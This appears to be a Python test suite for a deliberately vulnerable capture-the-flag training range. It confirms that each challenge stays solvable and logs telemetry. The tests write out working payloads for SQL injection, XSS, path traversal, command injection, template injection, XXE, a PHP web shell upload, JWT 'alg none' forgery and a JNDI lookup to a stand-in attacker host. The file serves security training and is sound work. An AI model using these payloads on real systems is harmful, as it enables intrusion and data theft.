"""Tests for the HELP AG VAPT CTF range.

These assert that the intentional vulnerabilities still work (a regression here
means a challenge became unsolvable) and that the scoring layer is sound.
"""

import json
import tempfile
import unittest
from pathlib import Path

from app import create_app
from labsite.catalog import CHALLENGES, CHALLENGES_BY_ID, TOTAL_POINTS, identify

REPO_ROOT = Path(__file__).resolve().parent.parent


class RangeTestCase(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        base = Path(self.temp.name)
        self.log_path = base / "events.jsonl"
        self.app = create_app({
            "TESTING": True,
            "LAB_MODE": True,
            "DATABASE_PATH": str(base / "lab.db"),
            "EVENT_LOG_PATH": str(self.log_path),
            "UPLOAD_DIR": str(base / "uploads"),
            "DOCUMENT_DIR": str(REPO_ROOT / "public_docs"),
            "BACKUP_DIR": str(REPO_ROOT / "backups"),
            "SPLUNK_HEC_URL": "",
            "SPLUNK_HEC_TOKEN": "",
        })
        self.client = self.app.test_client()

    def tearDown(self):
        self.temp.cleanup()

    def events(self):
        if not self.log_path.exists():
            return []
        return [json.loads(line) for line in self.log_path.read_text().splitlines()]

    def event_types(self):
        return {event["event_type"] for event in self.events()}

    def flag_of(self, challenge_id):
        return CHALLENGES_BY_ID[challenge_id]["flag"]


class TestCatalog(RangeTestCase):
    def test_ids_and_flags_are_unique(self):
        ids = [c["id"] for c in CHALLENGES]
        flags = [c["flag"] for c in CHALLENGES]
        self.assertEqual(len(ids), len(set(ids)))
        self.assertEqual(len(flags), len(set(flags)))

    def test_flag_format(self):
        for challenge in CHALLENGES:
            self.assertRegex(challenge["flag"], r"^HELPAG\{[A-Za-z0-9_]+\}$")

    def test_every_challenge_has_mitre_and_detection_mapping(self):
        for challenge in CHALLENGES:
            self.assertTrue(challenge["mitre"], challenge["id"])
            self.assertTrue(challenge["events"], challenge["id"])
            for technique, name in challenge["mitre"]:
                self.assertRegex(technique, r"^T\d{4}(\.\d{3})?$")
                self.assertTrue(name)

    def test_identify_round_trips(self):
        for challenge in CHALLENGES:
            self.assertEqual(identify(challenge["flag"]), challenge["id"])
        self.assertIsNone(identify("HELPAG{not-a-real-flag}"))

    def test_public_catalog_never_leaks_a_flag(self):
        body = self.client.get("/api/ctf/challenges").get_json()
        self.assertNotIn("HELPAG{", json.dumps(body))


class TestLabGuard(RangeTestCase):
    def test_requests_refused_when_lab_mode_is_off(self):
        guarded = create_app({
            "TESTING": True, "LAB_MODE": False,
            "DATABASE_PATH": str(Path(self.temp.name) / "guard.db"),
            "EVENT_LOG_PATH": str(Path(self.temp.name) / "guard.jsonl"),
        }).test_client()
        self.assertEqual(guarded.get("/").status_code, 503)
        self.assertEqual(guarded.get("/api/diagnostics/ping?host=1;id").status_code, 503)
        self.assertEqual(guarded.get("/health").status_code, 200)


class TestScoring(RangeTestCase):
    def register(self, team="unit-test"):
        return self.client.post("/api/ctf/team", json={"team": team})

    def test_submission_requires_a_team(self):
        response = self.client.post("/api/ctf/submit", json={"flag": self.flag_of("access-idor")})
        self.assertEqual(response.status_code, 400)

    def test_team_name_is_validated(self):
        self.assertEqual(self.client.post("/api/ctf/team", json={"team": "x"}).status_code, 400)
        self.assertEqual(self.client.post("/api/ctf/team", json={"team": "a<b>"}).status_code, 400)
        self.assertEqual(self.register().status_code, 200)

    def test_correct_flag_scores_once(self):
        self.register()
        flag = self.flag_of("access-idor")
        first = self.client.post("/api/ctf/submit", json={"flag": flag}).get_json()
        self.assertTrue(first["correct"])
        self.assertFalse(first["duplicate"])
        self.assertTrue(first["first_blood"])
        second = self.client.post("/api/ctf/submit", json={"flag": flag}).get_json()
        self.assertTrue(second["duplicate"])
        self.assertEqual(second["earned"], CHALLENGES_BY_ID["access-idor"]["points"])

    def test_wrong_flag_is_rejected_and_logged(self):
        self.register()
        body = self.client.post("/api/ctf/submit", json={"flag": "HELPAG{nope}"}).get_json()
        self.assertFalse(body["correct"])
        self.assertIn("ctf_flag_rejected", self.event_types())

    def test_scoreboard_totals(self):
        self.register("alpha")
        for challenge_id in ("access-idor", "logic-negative"):
            self.client.post("/api/ctf/submit", json={"flag": self.flag_of(challenge_id)})
        board = self.client.get("/api/ctf/scoreboard").get_json()
        self.assertEqual(board["total_points"], TOTAL_POINTS)
        self.assertEqual(board["teams"][0]["team"], "alpha")
        self.assertEqual(board["teams"][0]["points"],
                         CHALLENGES_BY_ID["access-idor"]["points"]
                         + CHALLENGES_BY_ID["logic-negative"]["points"])


class TestVulnerabilitiesStillWork(RangeTestCase):
    """Each test proves one challenge is still solvable and still emits telemetry."""

    def test_recon_robots(self):
        self.assertIn(b"Disallow: /internal/", self.client.get("/robots.txt").data)
        body = self.client.get("/internal/engineering-notes.txt").data.decode()
        self.assertIn(self.flag_of("recon-robots"), body)
        self.assertIn("recon_hidden_path", self.event_types())

    def test_misconfig_debug(self):
        body = self.client.get("/api/debug/config").get_json()
        self.assertEqual(body["flag"], self.flag_of("misconfig-debug"))
        self.assertIn("debug_endpoint_access", self.event_types())

    def test_misconfig_dotenv(self):
        body = self.client.get("/.env").data.decode()
        self.assertIn(self.flag_of("misconfig-dotenv"), body)
        self.assertIn("sensitive_file_access", self.event_types())

    def test_misconfig_backups(self):
        self.assertIn(b"site-config.bak", self.client.get("/backups/").data)
        body = self.client.get("/backups/site-config.bak").data.decode()
        self.assertIn(self.flag_of("misconfig-backups"), body)
        self.assertIn("directory_listing_access", self.event_types())

    def test_access_idor(self):
        body = self.client.get("/api/users/1337").get_json()
        self.assertIn(self.flag_of("access-idor"), body["note"])
        self.assertIn("broken_access_attempt", self.event_types())

    def test_access_mass_assignment(self):
        body = self.client.post("/api/profile/update",
                                json={"email": "a@lab.invalid", "role": "admin"}).get_json()
        self.assertEqual(body["flag"], self.flag_of("access-massassign"))
        self.assertIn("privilege_change", self.event_types())

    def test_sqli_union(self):
        response = self.client.get(
            "/api/products/search?q=' UNION SELECT id,label,value FROM flags-- ")
        self.assertIn(self.flag_of("inject-sqli-union"), response.data.decode())
        self.assertIn("sql_query", self.event_types())

    def test_sqli_auth_bypass(self):
        body = self.client.post("/api/legacy/login",
                                json={"username": "admin'-- ", "password": "x"}).get_json()
        self.assertTrue(body["authenticated"])
        self.assertEqual(body["flag"], self.flag_of("inject-sqli-auth"))

    def test_reflected_xss(self):
        body = self.client.get("/reflect?name=<script>alert(1)</script>").data.decode()
        self.assertIn("<script>alert(1)</script>", body)
        self.assertIn(self.flag_of("xss-reflected"), body)
        self.assertIn("xss_probe", self.event_types())

    def test_stored_xss(self):
        self.client.post("/guestbook", json={"author": "t", "message": "<script>x()</script>"})
        body = self.client.get("/admin/review").get_json()
        self.assertEqual(body["flag"], self.flag_of("xss-stored"))
        self.assertIn("stored_xss_persisted", self.event_types())

    def test_path_traversal(self):
        body = self.client.get("/api/documents/download?file=../flagstore/traversal.flag")
        self.assertIn(self.flag_of("file-traversal"), body.data.decode())
        self.assertIn("path_traversal_attempt", self.event_types())

    def test_command_injection(self):
        body = self.client.get(
            "/api/diagnostics/ping?host=127.0.0.1; cat flagstore/cmdi.flag").data.decode()
        self.assertIn(self.flag_of("rce-cmdi"), body)
        self.assertIn("command_execution", self.event_types())

    def test_ssti(self):
        self.assertIn(b"49", self.client.get("/api/newsletter/preview?template={{7*7}}").data)
        payload = "{{ cycler.__init__.__globals__.os.popen('cat flagstore/ssti.flag').read() }}"
        body = self.client.get("/api/newsletter/preview", query_string={"template": payload})
        self.assertIn(self.flag_of("rce-ssti"), body.data.decode())
        self.assertIn("ssti_attempt", self.event_types())

    def test_xxe(self):
        payload = (f'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM '
                   f'"file://{REPO_ROOT}/flagstore/xxe.flag">]><r>&x;</r>')
        body = self.client.post("/api/suppliers/import", data=payload,
                                content_type="application/xml").data.decode()
        self.assertIn(self.flag_of("inject-xxe"), body)
        self.assertIn("xxe_attempt", self.event_types())

    def test_unrestricted_upload(self):
        import io
        body = self.client.post("/api/upload", content_type="multipart/form-data", data={
            "file": (io.BytesIO(b'<?php system($_GET["cmd"]); ?>'), "shell.php")}).get_json()
        self.assertEqual(body["flag"], self.flag_of("upload-unrestricted"))
        self.assertIn("dangerous_upload", self.event_types())

    def test_jwt_alg_none(self):
        import base64

        def b64(payload):
            return base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=")

        token = f'{b64({"alg": "none", "typ": "JWT"})}.{b64({"sub": "x", "role": "admin"})}.'
        body = self.client.get("/api/admin/report",
                               headers={"Authorization": f"Bearer {token}"}).get_json()
        self.assertEqual(body["flag"], self.flag_of("auth-jwt-none"))
        self.assertIn("jwt_unsigned_accepted", self.event_types())

    def test_signed_token_does_not_release_the_flag(self):
        token = self.client.get("/api/token?username=alice").get_json()["token"]
        response = self.client.get("/api/admin/report",
                                   headers={"Authorization": f"Bearer {token}"})
        self.assertEqual(response.status_code, 403)

    def test_forged_session_reaches_admin_panel(self):
        self.assertEqual(self.client.get("/admin/panel").status_code, 403)
        with self.client.session_transaction() as flask_session:
            flask_session["is_admin"] = True
        body = self.client.get("/admin/panel").get_json()
        self.assertEqual(body["flag"], self.flag_of("auth-weak-secret"))
        self.assertIn("forged_session_detected", self.event_types())

    def test_brute_force_has_no_lockout(self):
        for _ in range(8):
            self.client.post("/api/login", json={"username": "svc_backup", "password": "wrong"})
        body = self.client.post("/api/login",
                                json={"username": "svc_backup", "password": "summer2024"}).get_json()
        self.assertTrue(body["authenticated"])  # still accepted after 8 failures
        self.assertEqual(body["flag"], self.flag_of("auth-bruteforce"))
        self.assertIn("brute_force_suspected", self.event_types())

    def test_predictable_reset_token(self):
        import hashlib
        token = hashlib.md5(b"j.ellison").hexdigest()
        self.client.post("/api/password-reset/request", json={"username": "j.ellison"})
        body = self.client.post("/api/password-reset/consume",
                                json={"username": "j.ellison", "token": token}).get_json()
        self.assertEqual(body["flag"], self.flag_of("auth-reset-token"))
        self.assertIn("account_takeover", self.event_types())

    def test_ssrf_is_bounded_to_the_lab(self):
        blocked = self.client.get("/api/fetch?url=http://example.com/")
        self.assertEqual(blocked.status_code, 403)
        self.assertIn("ssrf_probe", self.event_types())

    def test_business_logic_abuse(self):
        body = self.client.post("/api/checkout",
                                json={"quantity": -5, "unit_price": 900}).get_json()
        self.assertEqual(body["total"], -4500)
        self.assertEqual(body["flag"], self.flag_of("logic-negative"))
        self.assertIn("business_logic_abuse", self.event_types())

    def test_jndi_lookup(self):
        body = self.client.get("/api/legacy/audit", headers={
            "X-Audit-Agent": "${jndi:ldap://attacker.lab.invalid/a}"}).get_json()
        self.assertEqual(body["flag"], self.flag_of("inject-jndi"))
        self.assertFalse(body["logged"] is False)
        self.assertIn("jndi_lookup_detected", self.event_types())


class TestTelemetry(RangeTestCase):
    def test_every_event_carries_the_correlation_fields(self):
        self.client.get("/api/debug/config")
        for event in self.events():
            for field in ("timestamp", "event_type", "severity", "source_ip",
                          "method", "path", "user_agent", "test_id"):
                self.assertIn(field, event)

    def test_test_id_header_is_propagated(self):
        self.client.get("/api/debug/config", headers={"X-Lab-Test-ID": "run-42"})
        self.assertIn("run-42", {event["test_id"] for event in self.events()})

    def test_404s_are_recorded_for_scanner_detection(self):
        self.client.get("/definitely-not-a-real-path")
        self.assertIn("http_not_found", self.event_types())


if __name__ == "__main__":
    unittest.main()
